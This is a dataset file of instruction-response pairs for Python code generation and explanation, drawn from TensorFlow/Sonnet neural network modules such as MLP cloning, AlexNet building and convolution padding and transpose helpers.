{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncreating a new MLP with the same structure.", "response": "def clone(self, name=None):\n    \"\"\"Creates a new MLP with the same structure.\n\n    Args:\n      name: Optional string specifying the name of the new module. The default\n        name is constructed by appending \"_clone\" to the original name.\n\n    Returns:\n      A cloned `MLP` module.\n    \"\"\"\n\n    if name is None:\n      name = self.module_name + \"_clone\"\n    return MLP(\n        name=name,\n        output_sizes=self.output_sizes,\n        activation=self.activation,\n        activate_final=self.activate_final,\n        initializers=self.initializers,\n        partitioners=self.partitioners,\n        regularizers=self.regularizers,\n        use_bias=self.use_bias,\n        use_dropout=self.use_dropout)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncalculating the minimum size of the input layer.", "response": "def _calc_min_size(self, conv_layers):\n    \"\"\"Calculates the minimum size of the input layer.\n\n    Given a set of convolutional layers, calculate the minimum value of\n    the `input_height` and `input_width`, i.e. such that the output has\n    size 1x1. Assumes snt.VALID padding.\n\n    Args:\n      conv_layers: List of tuples `(output_channels, (kernel_size, stride),\n        (pooling_size, pooling_stride))`\n\n    Returns:\n      Minimum value of input height and width.\n    \"\"\"\n    input_size = 1\n\n    for _, conv_params, max_pooling in reversed(conv_layers):\n      if max_pooling is not None:\n        kernel_size, stride = max_pooling\n        input_size = input_size * stride + (kernel_size - stride)\n\n      if conv_params is not None:\n        kernel_size, stride = conv_params\n        input_size = input_size * stride + (kernel_size - stride)\n\n    return input_size"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nconnect the AlexNet module into the graph.", "response": "def _build(self, inputs, keep_prob=None, is_training=None,\n             test_local_stats=True):\n    \"\"\"Connects the AlexNet module into the graph.\n\n    The is_training flag only controls the batch norm settings, if `False` it\n    does not force no dropout by overriding any input `keep_prob`. To avoid any\n    confusion this may cause, if `is_training=False` and `keep_prob` would cause\n    dropout to be applied, an error is thrown.\n\n    Args:\n      inputs: A Tensor of size [batch_size, input_height, input_width,\n        input_channels], representing a batch of input images.\n      keep_prob: A scalar Tensor representing the dropout keep probability.\n        When `is_training=False` this must be None or 1 to give no dropout.\n      is_training: Boolean to indicate if we are currently training. Must be\n          specified if batch normalization or dropout is used.\n      test_local_stats: Boolean to indicate to `snt.BatchNorm` if batch\n        normalization should  use local batch statistics at test time.\n        By default `True`.\n\n    Returns:\n      A Tensor of size [batch_size, output_size], where `output_size` depends\n      on the mode the network was constructed in.\n\n    Raises:\n      base.IncompatibleShapeError: If any of the input image dimensions\n        (input_height, input_width) are too small for the given network mode.\n      ValueError: If `keep_prob` is not None or 1 when `is_training=False`.\n      ValueError: If `is_training` is not explicitly specified when using\n        batch normalization.\n    \"\"\"\n    # Check input shape\n    if (self._use_batch_norm or keep_prob is not None) and is_training is None:\n      raise ValueError(\"Boolean is_training flag must be explicitly specified \"\n                       \"when using batch normalization or dropout.\")\n\n    input_shape = inputs.get_shape().as_list()\n    if input_shape[1] < self._min_size or input_shape[2] < self._min_size:\n      raise base.IncompatibleShapeError(\n          \"Image shape too small: ({:d}, {:d}) < {:d}\".format(\n              input_shape[1], input_shape[2], self._min_size))\n\n    net = inputs\n\n    # Check keep prob\n    if keep_prob is not None:\n      valid_inputs = tf.logical_or(is_training, tf.equal(keep_prob, 1.))\n      keep_prob_check = tf.assert_equal(\n          valid_inputs, True,\n          message=\"Input `keep_prob` must be None or 1 if `is_training=False`.\")\n      with tf.control_dependencies([keep_prob_check]):\n        net = tf.identity(net)\n\n    for i, params in enumerate(self._conv_layers):\n      output_channels, conv_params, max_pooling = params\n\n      kernel_size, stride = conv_params\n\n      conv_mod = conv.Conv2D(\n          name=\"conv_{}\".format(i),\n          output_channels=output_channels,\n          kernel_shape=kernel_size,\n          stride=stride,\n          padding=conv.VALID,\n          initializers=self._initializers,\n          partitioners=self._partitioners,\n          regularizers=self._regularizers)\n\n      if not self.is_connected:\n        self._conv_modules.append(conv_mod)\n\n      net = conv_mod(net)\n\n      if self._use_batch_norm:\n        bn = batch_norm.BatchNorm(**self._batch_norm_config)\n        net = bn(net, is_training, test_local_stats)\n\n      net = tf.nn.relu(net)\n\n      if max_pooling is not None:\n        pooling_kernel_size, pooling_stride = max_pooling\n        net = tf.nn.max_pool(\n            net,\n            ksize=[1, pooling_kernel_size, pooling_kernel_size, 1],\n            strides=[1, pooling_stride, pooling_stride, 1],\n            padding=conv.VALID)\n\n    net = basic.BatchFlatten(name=\"flatten\")(net)\n\n    for i, output_size in enumerate(self._fc_layers):\n      linear_mod = basic.Linear(\n          name=\"fc_{}\".format(i),\n          output_size=output_size,\n          initializers=self._initializers,\n          partitioners=self._partitioners)\n\n      if not self.is_connected:\n        self._linear_modules.append(linear_mod)\n\n      net = linear_mod(net)\n\n      if self._use_batch_norm and self._bn_on_fc_layers:\n        bn = batch_norm.BatchNorm(**self._batch_norm_config)\n        net = bn(net, is_training, test_local_stats)\n\n      net = tf.nn.relu(net)\n\n      if keep_prob is not None:\n        net = tf.nn.dropout(net, keep_prob=keep_prob)\n\n    return net"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngenerates one input sequence and output label.", "response": "def _get_single_set(self, num_objects, num_features):\n    \"\"\"Generate one input sequence and output label.\n\n    Each sequences of objects has a feature that consists of the feature vector\n    for that object plus the encoding for its ID, the reference vector ID and\n    the n-th value relative ID for a total feature size of:\n\n      `num_objects` * 3  + `num_features`\n\n    Args:\n      num_objects: int. number of objects in the sequence.\n      num_features: int. feature size of each object.\n\n    Returns:\n      1. np.ndarray (`num_objects`, (`num_features` + 3 * `num_objects`)).\n      2. np.ndarray (1,). Output object reference label.\n    \"\"\"\n    # Generate random binary vectors\n    data = np.random.uniform(-1, 1, size=(num_objects, num_features))\n\n    distances = spdistance.squareform(spdistance.pdist(data))\n    distance_idx = np.argsort(distances)\n\n    # Choose random distance\n    nth = np.random.randint(0, num_objects)\n\n    # Pick out the nth furthest for each object\n    nth_furthest = distance_idx[:, nth]\n\n    # Choose random reference object\n    reference = np.random.randint(0, num_objects)\n\n    # Get identity of object that is the nth furthest from reference object\n    labels = nth_furthest[reference]\n\n    # Compile data\n    object_ids = np.identity(num_objects)\n    nth_matrix = np.zeros((num_objects, num_objects))\n    nth_matrix[:, nth] = 1\n    reference_object = np.zeros((num_objects, num_objects))\n    reference_object[:, reference] = 1\n\n    inputs = np.concatenate([data, object_ids, reference_object, nth_matrix],\n                            axis=-1)\n    inputs = np.random.permutation(inputs)\n    labels = np.expand_dims(labels, axis=0)\n    return inputs.astype(np.float32), labels.astype(np.float32)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nassembles a batch of input tensors and output labels.", "response": "def _get_batch_data(self, batch_size, num_objects, num_features):\n    \"\"\"Assembles a batch of input tensors and output labels.\n\n    Args:\n      batch_size: int. number of sequence batches.\n      num_objects: int. number of objects in the sequence.\n      num_features: int. feature size of each object.\n\n    Returns:\n      1. np.ndarray (`batch_size`, `num_objects`,\n                     (`num_features` + 3 * `num_objects`)).\n      2. np.ndarray (`batch_size`). Output object reference label.\n    \"\"\"\n    all_inputs = []\n    all_labels = []\n    for _ in six.moves.range(batch_size):\n      inputs, labels = self._get_single_set(num_objects, num_features)\n      all_inputs += [inputs]\n      all_labels += [labels]\n    input_data = np.concatenate(all_inputs, axis=0)\n    label_data = np.concatenate(all_labels, axis=0)\n    return input_data, label_data"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_batch(self):\n    params = [self._batch_size, self._num_objects, self._num_features]\n    inputs, labels = tf.py_func(self._get_batch_data, params,\n                                [tf.float32, tf.float32])\n    inputs = tf.reshape(inputs, [self._batch_size, self._num_objects,\n                                 self._num_features + self._num_objects * 3])\n    labels = tf.reshape(labels, [-1])\n    return inputs, labels", "response": "Returns set of nth - farthest input tensors and labels."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _default_transpose_size(input_shape, stride, kernel_shape=None,\n                            padding=SAME):\n  \"\"\"Returns default (maximal) output shape for a transpose convolution.\n\n  In general, there are multiple possible output shapes that a transpose\n  convolution with a given `input_shape` can map to. This function returns the\n  output shape which evenly divides the stride to produce the input shape in\n  a forward convolution, i.e. the maximal valid output shape with the given\n  configuration:\n\n  if the padding type is SAME then:  output_shape = input_shape * stride\n  if the padding type is VALID then: output_shape = input_shape * stride +\n                                                    kernel_shape - 1\n\n  See the following documentation for an explanation of VALID versus SAME\n  padding modes:\n  https://www.tensorflow.org/versions/r0.8/api_docs/python/nn.html#convolution\n\n  Args:\n    input_shape: Sequence of sizes of each dimension of the input, excluding\n      batch and channel dimensions.\n    stride: Sequence or integer of kernel strides, excluding batch and channel\n      dimension strides.\n    kernel_shape: Sequence or integer of kernel sizes.\n    padding: Padding algorithm, either `snt.SAME` or `snt.VALID`.\n\n  Returns:\n    output_shape: A tuple of sizes for a transposed convolution that divide\n      evenly with the given strides, kernel shapes, and padding algorithm.\n  \"\"\"\n  if not input_shape:\n    raise TypeError(\"input_shape is None; if using Sonnet, are you sure you \"\n                    \"have connected the module to inputs?\")\n  input_length = len(input_shape)\n  stride = _fill_and_verify_parameter_shape(stride, input_length, \"stride\")\n  padding = _verify_conv_op_supported_padding(padding)\n\n  output_shape = tuple(x * y for x, y in zip(input_shape, stride))\n\n  if padding == VALID:\n    kernel_shape = _fill_and_verify_parameter_shape(kernel_shape, input_length,\n                                                    \"kernel\")\n    output_shape = tuple(x + y - 1 for x, y in zip(output_shape, kernel_shape))\n\n  return output_shape", "response": "Returns the default output shape for a transpose convolution."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nconvert a dimension to a tuple of dimensions of a given size.", "response": "def _fill_shape(x, n):\n  \"\"\"Converts a dimension to a tuple of dimensions of a given size.\n\n  This is used to allow shorthand notation for various configuration parameters.\n  A user can provide either, for example, `2` or `[2, 2]` as a kernel shape, and\n  this function returns `(2, 2)` in both cases. Passing `[1, 2]` will return\n  `(1, 2)`.\n\n  Args:\n    x: An integer, tf.Dimension, or an iterable of them.\n    n: An integer, the size of the desired output list\n\n  Returns:\n    If `x` is an integer, a tuple of size `n` containing `n` copies of `x`.\n    If `x` is an iterable of integers or tf.Dimension of size `n`, it returns\n      `tuple(x)`.\n\n  Raises:\n    TypeError: If n is not a positive integer;\n      or if x is neither integer nor an iterable of size n.\n  \"\"\"\n  if not isinstance(n, numbers.Integral) or n < 1:\n    raise TypeError(\"n must be a positive integer\")\n\n  if (isinstance(x, numbers.Integral) or isinstance(x, tf.Dimension)) and x > 0:\n    return (x,) * n\n\n  try:\n    if len(x) == n and all(v > 0 for v in x):\n      return tuple(x)\n  except TypeError:\n    pass\n\n  raise TypeError(\"x is {}, must be either a positive integer \"\n                  \"or an iterable of positive integers of size {}\"\n                  .format(x, n))"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _fill_and_verify_parameter_shape(x, n, parameter_label):\n  try:\n    return _fill_shape(x, n)\n  except TypeError as e:\n    raise base.IncompatibleShapeError(\"Invalid \" + parameter_label + \" shape: \"\n                                      \"{}\".format(e))", "response": "Expands x if necessary into a n - D kernel shape and reports errors."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _fill_and_verify_padding(padding, n):\n  if not isinstance(n, numbers.Integral) or n < 1:\n    raise TypeError(\"n must be a positive integer\")\n\n  if isinstance(padding, six.string_types) and padding in ALLOWED_PADDINGS:\n    return (padding,) * n\n\n  try:\n    if len(padding) == n and all(p in ALLOWED_PADDINGS for p in padding):\n      return tuple(padding)\n  except TypeError:\n    pass\n\n  raise TypeError(\"padding is {}, must be member of '{}' or an iterable of \"\n                  \"these of size {}\".format(padding, ALLOWED_PADDINGS, n))", "response": "Verifies that the provided padding is supported and expands to size n."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns a boolean indicating whether to use SAME or VALID for the underlying convolution op.", "response": "def _padding_to_conv_op_padding(padding):\n  \"\"\"Whether to use SAME or VALID for the underlying convolution op.\n\n  Args:\n    padding: A tuple of members of ALLOWED_PADDINGS, e.g. as returned from\n      `_fill_and_verify_padding`.\n\n  Returns:\n    One of CONV_OP_ALLOWED_PADDINGS, the padding method to use for the\n    underlying convolution op.\n\n  Raises:\n    ValueError: If padding is not a tuple.\n  \"\"\"\n  if not isinstance(padding, tuple):\n    raise ValueError(\"padding should be a tuple.\")\n  if all(p == SAME for p in padding):\n    # If we want SAME padding for all dimensions then we can use SAME for the\n    # conv and avoid doing any extra padding.\n    return SAME\n  else:\n    # Otherwise we prefer to use VALID, since we can implement all the other\n    # padding types just by adding some extra padding before doing a VALID conv.\n    # (We could use SAME but then we'd also have to crop outputs in some cases).\n    return VALID"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nexpanding the provided stride to size n and pads it with 1s.", "response": "def _fill_and_one_pad_stride(stride, n, data_format=DATA_FORMAT_NHWC):\n  \"\"\"Expands the provided stride to size n and pads it with 1s.\"\"\"\n  if isinstance(stride, numbers.Integral) or (\n      isinstance(stride, collections.Iterable) and len(stride) <= n):\n    if data_format.startswith(\"NC\"):\n      return (1, 1,) + _fill_shape(stride, n)\n    elif data_format.startswith(\"N\") and data_format.endswith(\"C\"):\n      return (1,) + _fill_shape(stride, n) + (1,)\n    else:\n      raise ValueError(\n          \"Invalid data_format {:s}. Must start with N and have a channel dim \"\n          \"either follow the N dim or come at the end\".format(data_format))\n  elif isinstance(stride, collections.Iterable) and len(stride) == n + 2:\n    return stride\n  else:\n    raise base.IncompatibleShapeError(\n        \"stride is {} ({}), must be either a positive integer or an iterable of\"\n        \" positive integers of size {}\".format(stride, type(stride), n))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nverify that the inputs are semantically correct.", "response": "def _verify_inputs(inputs, channel_index, data_format):\n  \"\"\"Verifies `inputs` is semantically correct.\n\n  Args:\n    inputs: An input tensor provided by the user.\n    channel_index: The index of the channel dimension.\n    data_format: The format of the data in `inputs`.\n\n  Raises:\n    base.IncompatibleShapeError: If the shape of `inputs` doesn't match\n      `data_format`.\n    base.UnderspecifiedError: If the channel dimension of `inputs` isn't\n      defined.\n    TypeError: If input Tensor dtype is not compatible with either\n      `tf.float16`, `tf.bfloat16` or `tf.float32`.\n  \"\"\"\n  # Check shape.\n  input_shape = tuple(inputs.get_shape().as_list())\n  if len(input_shape) != len(data_format):\n    raise base.IncompatibleShapeError((\n        \"Input Tensor must have rank {} corresponding to \"\n        \"data_format {}, but instead was {} of rank {}.\").format(\n            len(data_format), data_format, input_shape, len(input_shape)))\n\n  # Check type.\n  if not (tf.float16.is_compatible_with(inputs.dtype) or\n          tf.bfloat16.is_compatible_with(inputs.dtype) or\n          tf.float32.is_compatible_with(inputs.dtype)):\n    raise TypeError(\n        \"Input must have dtype tf.float16, tf.bfloat16 or tf.float32, \"\n        \"but dtype was {}\".format(inputs.dtype))\n\n  # Check channel dim.\n  input_channels = input_shape[channel_index]\n  if input_channels is None:\n    raise base.UnderspecifiedError(\n        \"Number of input channels must be known at module build time\")"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning a default initializer for the weights of a convolutional module.", "response": "def create_weight_initializer(fan_in_shape, dtype=tf.float32):\n  \"\"\"Returns a default initializer for the weights of a convolutional module.\"\"\"\n  stddev = 1 / math.sqrt(np.prod(fan_in_shape))\n  return tf.truncated_normal_initializer(stddev=stddev, dtype=dtype)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _find_channel_index(data_format):\n  for i, c in enumerate(data_format):\n    if c == \"C\":\n      return i\n  raise ValueError(\"data_format requires a channel dimension. Got: {}\"\n                   .format(data_format))", "response": "Returns the index of the channel dimension."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _apply_bias(inputs, outputs, channel_index, data_format, output_channels,\n                initializers, partitioners, regularizers):\n  \"\"\"Initialize and apply a bias to the outputs.\n\n  Figures out the shape of the bias vector, initialize it, and applies it.\n\n  Args:\n    inputs: A Tensor of shape `data_format`.\n    outputs: A Tensor of shape `data_format`.\n    channel_index: The index of the channel dimension in `inputs`.\n    data_format: Format of `inputs`.\n    output_channels: Channel dimensionality for `outputs`.\n    initializers: Optional dict containing ops to initialize the biases\n      (with key 'b').\n    partitioners: Optional dict containing partitioners to partition the\n      biases (with key 'b').\n    regularizers: Optional dict containing regularizers for the biases\n      (with key 'b').\n\n  Returns:\n    b: The constructed bias variable.\n    outputs: The `outputs` argument that has had a bias applied.\n  \"\"\"\n  bias_shape = (output_channels,)\n  if \"b\" not in initializers:\n    initializers[\"b\"] = create_bias_initializer(bias_shape,\n                                                dtype=inputs.dtype)\n  b = tf.get_variable(\"b\",\n                      shape=bias_shape,\n                      dtype=inputs.dtype,\n                      initializer=initializers[\"b\"],\n                      partitioner=partitioners.get(\"b\", None),\n                      regularizer=regularizers.get(\"b\", None))\n\n  # tf.nn.bias_add only supports 2 data formats.\n  if data_format in (DATA_FORMAT_NHWC, DATA_FORMAT_NCHW):\n    # Supported as-is.\n    outputs = tf.nn.bias_add(outputs, b, data_format=data_format)\n  else:\n    # Create our own bias vector.\n    bias_correct_dim = [1] * len(data_format)\n    bias_correct_dim[channel_index] = output_channels\n    outputs += tf.reshape(b, bias_correct_dim)\n\n  return b, outputs", "response": "Initialize and apply a bias to the outputs."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _build(self, inputs):\n    _verify_inputs(inputs, self._channel_index, self._data_format)\n    self._input_shape = tuple(inputs.get_shape().as_list())\n    self._input_channels = self._input_shape[self._channel_index]\n\n    self._w = self._construct_w(inputs)\n\n    if self._mask is not None:\n      w = self._apply_mask()\n    else:\n      w = self._w\n\n    inputs = self._pad_input(inputs)\n    outputs = self._apply_conv(inputs, w)\n\n    if self._use_bias:\n      self._b, outputs = _apply_bias(\n          inputs, outputs, self._channel_index, self._data_format,\n          self.output_channels, self._initializers, self._partitioners,\n          self._regularizers)\n\n    return outputs", "response": "Connects the _ConvND module into the graph with input Tensor inputs."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _pad_input(self, inputs):\n    if all(p == self._conv_op_padding for p in self._padding):\n      # All axes require the same padding type that we're going to use for the\n      # underlying convolution op, so nothing needs to be done:\n      return inputs\n\n    # In all other cases we use VALID as the underlying padding type, and for\n    # the axes which require something other than VALID, we pad inputs ourselves\n    # before the convolution.\n    assert self._conv_op_padding == VALID\n\n    def pad_amount(kernel_size, rate, padding):\n      \"\"\"Pre- and post-padding required for a particular axis before conv op.\"\"\"\n      # The effective kernel size includes any holes/gaps introduced by the\n      # dilation rate. It's equal to kernel_size when rate == 1.\n      effective_kernel_size = int((kernel_size - 1) * rate + 1)\n      if padding == FULL:\n        return [effective_kernel_size - 1, effective_kernel_size - 1]\n      if padding == CAUSAL:\n        return [effective_kernel_size - 1, 0]\n      if padding == REVERSE_CAUSAL:\n        return [0, effective_kernel_size - 1]\n      if padding == SAME:\n        return [(effective_kernel_size - 1) // 2, effective_kernel_size // 2]\n      # padding == VALID\n      return [0, 0]\n\n    paddings = map(pad_amount, self._kernel_shape, self._rate, self._padding)\n    if self._data_format.startswith(\"NC\"):  # N, C, ...\n      paddings = [[0, 0], [0, 0]] + list(paddings)\n    else:  # N, ..., C\n      paddings = [[0, 0]] + list(paddings) + [[0, 0]]\n\n    return tf.pad(inputs, paddings)", "response": "Pads the input tensor with the desired padding type."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\napplying a convolution operation on inputs using variable w.", "response": "def _apply_conv(self, inputs, w):\n    \"\"\"Apply a convolution operation on `inputs` using variable `w`.\n\n    Args:\n      inputs: A Tensor of shape `data_format` and of type `tf.float16`,\n          `tf.bfloat16` or `tf.float32`.\n      w: A weight matrix of the same type as `inputs`.\n\n    Returns:\n      outputs: The result of the convolution operation on `inputs`.\n    \"\"\"\n    outputs = tf.nn.convolution(inputs, w, strides=self._stride,\n                                padding=self._conv_op_padding,\n                                dilation_rate=self._rate,\n                                data_format=self._data_format)\n    return outputs"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\napplies the passed - in mask to the convolution matrix.", "response": "def _apply_mask(self):\n    \"\"\"Applies the passed-in mask to the convolution matrix.\n\n    Returns:\n      w: A copy of the convolution matrix that has had the mask applied.\n\n    Raises:\n      base.IncompatibleShapeError: If the mask shape has more dimensions than\n          the weight matrix.\n      base.IncompatibleShapeError: If the mask and the weight matrix don't\n          match on shape.\n    \"\"\"\n    w = self._w\n    w_shape = w.get_shape()\n    mask_shape = self._mask.get_shape()\n\n    if mask_shape.ndims > w_shape.ndims:\n      raise base.IncompatibleShapeError(\n          \"Invalid mask shape: {}. Max shape: {}\".format(\n              mask_shape.ndims, len(self._data_format)\n          )\n      )\n    if mask_shape != w_shape[:mask_shape.ndims]:\n      raise base.IncompatibleShapeError(\n          \"Invalid mask shape: {}. Weight shape: {}\".format(\n              mask_shape, w_shape\n          )\n      )\n    # TF broadcasting is a bit fragile.\n    # Expand the shape of self._mask by one dim at a time to the right\n    # until the rank matches `weight_shape`.\n    while self._mask.get_shape().ndims < w_shape.ndims:\n      self._mask = tf.expand_dims(self._mask, -1)\n\n    # tf.Variable & tf.ResourceVariable don't support *=.\n    w = w * self._mask  # pylint: disable=g-no-augmented-assignment\n\n    return w"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning the number of output channels.", "response": "def output_channels(self):\n    \"\"\"Returns the number of output channels.\"\"\"\n    if callable(self._output_channels):\n      self._output_channels = self._output_channels()\n    # Channel must be integer.\n    self._output_channels = int(self._output_channels)\n    return self._output_channels"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn the padding algorithm used for each SearchResult dimension.", "response": "def padding(self):\n    \"\"\"Returns the padding algorithm used, if this is the same for all dims.\n\n    Use `.paddings` if you want a tuple with the padding algorithm used for each\n    dimension.\n\n    Returns:\n      The padding algorithm used, if this is the same for all dimensions.\n\n    Raises:\n      ValueError: If different padding algorithms are used for different\n        dimensions.\n    \"\"\"\n    # This is for backwards compatibility -- previously only a single\n    # padding setting was supported across all dimensions.\n    if all(p == self._padding[0] for p in self._padding):\n      return self._padding[0]\n    else:\n      raise ValueError(\"This layer uses different paddings for different \"\n                       \"dimensions. Use .paddings if you want a tuple of \"\n                       \"per-dimension padding settings.\")"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef clone(self, name=None):\n    if name is None:\n      name = self.module_name + \"_clone\"\n\n    return type(self)(output_channels=self.output_channels,\n                      kernel_shape=self._kernel_shape,\n                      stride=self._stride,\n                      rate=self._rate,\n                      padding=self._padding,\n                      use_bias=self._use_bias,\n                      initializers=self._initializers,\n                      partitioners=self._partitioners,\n                      regularizers=self._regularizers,\n                      mask=self._mask,\n                      data_format=self._data_format,\n                      custom_getter=self._custom_getter,\n                      name=name)", "response": "Returns a copy of the current module."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _build(self, inputs):\n    _verify_inputs(inputs, self._channel_index, self._data_format)\n    self._input_shape = tuple(inputs.get_shape().as_list())\n    self._input_channels = self._input_shape[self._channel_index]\n\n    # First, figure out what the non-(N,C) dims will be.\n    if self._use_default_output_shape:\n      def _default_transpose_size_wrapper():\n        if self._data_format.startswith(\"NC\"):\n          input_size = self._input_shape[2:]\n          stride = self.stride[2:]\n        else:  # self._data_format == N*WC\n          input_size = self._input_shape[1:-1]\n          stride = self.stride[1:-1]\n        return _default_transpose_size(input_size,\n                                       stride,\n                                       kernel_shape=self._kernel_shape,\n                                       padding=self._padding)\n\n      self._output_shape = _default_transpose_size_wrapper\n\n    if len(self.output_shape) != self._n:\n      raise base.IncompatibleShapeError(\n          \"Output shape must have rank {}, but instead was {}\".format(\n              self._n, len(self.output_shape)))\n\n    # Now, construct the size of the output, including the N + C dims.\n    output_shape = self._infer_all_output_dims(inputs)\n\n    self._w = self._construct_w(inputs)\n\n    if self._n == 1:\n      # Add a dimension for the height.\n      if self._data_format == DATA_FORMAT_NWC:\n        h_dim = 1\n        two_dim_conv_data_format = DATA_FORMAT_NHWC\n      else:  # self._data_format == DATA_FORMAT_NCW\n        h_dim = 2\n        two_dim_conv_data_format = DATA_FORMAT_NCHW\n      inputs = tf.expand_dims(inputs, h_dim)\n      two_dim_conv_stride = self.stride[:h_dim] + (1,) + self.stride[h_dim:]\n      outputs = tf.nn.conv2d_transpose(inputs,\n                                       self._w,\n                                       output_shape,\n                                       strides=two_dim_conv_stride,\n                                       padding=self._padding,\n                                       data_format=two_dim_conv_data_format)\n      # Remove the height dimension to return a 3D tensor.\n      outputs = tf.squeeze(outputs, [h_dim])\n    elif self._n == 2:\n      outputs = tf.nn.conv2d_transpose(inputs,\n                                       self._w,\n                                       output_shape,\n                                       strides=self._stride,\n                                       padding=self._padding,\n                                       data_format=self._data_format)\n    else:\n      outputs = tf.nn.conv3d_transpose(inputs,\n                                       self._w,\n                                       output_shape,\n                                       strides=self._stride,\n                                       padding=self._padding,\n                                       data_format=self._data_format)\n\n    if self._use_bias:\n      self._b, outputs = _apply_bias(\n          inputs, outputs, self._channel_index, self._data_format,\n          self._output_channels, self._initializers, self._partitioners,\n          self._regularizers)\n\n    outputs = self._recover_shape_information(inputs, outputs)\n    return outputs", "response": "Connects the _ConvNDTranspose module into the graph."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _infer_all_output_dims(self, inputs):\n    # Use tensorflow shape op to manipulate inputs shape, so that unknown batch\n    # size - which can happen when using input placeholders - is handled\n    # correcly.\n    batch_size = tf.expand_dims(tf.shape(inputs)[0], 0)\n    out_channels = (self.output_channels,)\n\n    # Height dim needs to be added to everything for 1D Conv\n    # as we'll be using the 2D Conv Transpose op.\n    if self._n == 1:\n      out_shape = (1,) + self.output_shape\n    else:\n      out_shape = self.output_shape\n\n    if self._data_format.startswith(\"NC\"):\n      out_shape_tuple = out_channels + out_shape\n    elif self._data_format.startswith(\"N\") and self._data_format.endswith(\"C\"):\n      out_shape_tuple = out_shape + out_channels\n\n    output_shape = tf.concat([batch_size, out_shape_tuple], 0)\n    return output_shape", "response": "Infer the output shape for inputs after a deconvolution."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _recover_shape_information(self, inputs, outputs):\n    batch_size_value = inputs.get_shape()[0]\n    if self._data_format.startswith(\"NC\"):\n      output_shape_value = ((batch_size_value, self.output_channels) +\n                            self.output_shape)\n    elif self._data_format.startswith(\"N\") and self._data_format.endswith(\"C\"):\n      output_shape_value = ((batch_size_value,) + self.output_shape +\n                            (self.output_channels,))\n    outputs.set_shape(output_shape_value)\n    return outputs", "response": "Recover output tensor shape value to enable shape inference."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef output_shape(self):\n    if self._output_shape is None:\n      self._ensure_is_connected()\n    if callable(self._output_shape):\n      self._output_shape = tuple(self._output_shape())\n    return self._output_shape", "response": "Returns the output shape of the current node."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef transpose(self, name=None):\n    if name is None:\n      name = self.module_name + \"_transpose\"\n\n    if self._data_format == DATA_FORMAT_NWC:\n      stride = self._stride[1:-1]\n    else:  # self._data_format == DATA_FORMAT_NCW\n      stride = self._stride[2:]\n\n    return Conv1D(output_channels=lambda: self.input_channels,\n                  kernel_shape=self.kernel_shape,\n                  stride=stride,\n                  padding=self.padding,\n                  use_bias=self._use_bias,\n                  initializers=self.initializers,\n                  partitioners=self.partitioners,\n                  regularizers=self.regularizers,\n                  data_format=self._data_format,\n                  custom_getter=self._custom_getter,\n                  name=name)", "response": "Returns matching Conv1D module."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns a new module with matching input channels and output channels.", "response": "def transpose(self, name=None):\n    \"\"\"Returns matching `Conv2DTranspose` module.\n\n    Args:\n      name: Optional string assigning name of transpose module. The default name\n        is constructed by appending \"_transpose\" to `self.name`.\n\n    Returns:\n      `Conv2DTranspose` module.\n\n    Raises:\n     base.NotSupportedError: If `rate` in any dimension > 1.\n    \"\"\"\n    if any(x > 1 for x in self._rate):\n      raise base.NotSupportedError(\n          \"Cannot transpose a dilated convolution module.\")\n\n    if any(p != self._conv_op_padding for p in self._padding):\n      raise base.NotSupportedError(\n          \"Cannot tranpose a convolution using mixed paddings or paddings \"\n          \"other than SAME or VALID.\")\n\n    if name is None:\n      name = self.module_name + \"_transpose\"\n\n    def output_shape():\n      if self._data_format == DATA_FORMAT_NCHW:\n        return self.input_shape[2:4]\n      else:  # data_format == DATA_FORMAT_NHWC\n        return self.input_shape[1:3]\n\n    return Conv2DTranspose(output_channels=lambda: self._input_channels,\n                           output_shape=output_shape,\n                           kernel_shape=self._kernel_shape,\n                           stride=self._stride,\n                           padding=self._conv_op_padding,\n                           use_bias=self._use_bias,\n                           initializers=self._initializers,\n                           partitioners=self._partitioners,\n                           regularizers=self._regularizers,\n                           data_format=self._data_format,\n                           custom_getter=self._custom_getter,\n                           name=name)"}
